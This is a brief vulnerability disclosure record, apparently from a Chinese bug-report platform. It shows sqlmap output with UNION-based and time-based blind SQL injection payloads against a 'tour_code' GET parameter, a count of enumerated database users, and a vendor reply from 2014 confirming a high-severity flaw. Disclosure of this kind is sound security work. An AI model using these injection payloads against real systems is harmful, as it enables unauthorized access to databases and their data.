sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: tour_code    Type: UNION query    Title: MySQL UNION query (NULL) - 1 column    Payload: tour_code=ESC11M' LIMIT 1,1 UNION ALL SELECT CONCAT(0x3a7365763a,0x61727a746265546e746b,0x3a756f6d3a)#    Vector:  UNION ALL SELECT [QUERY]#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: tour_code=ESC11M' AND SLEEP(5) AND 'icso'='icso    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])---database management system users [7]:

wybug_reply: 漏洞回应 厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-22 16:11 厂商回复： 漏洞已确认真实存在，并已安排人处理。 最新状态： 暂无
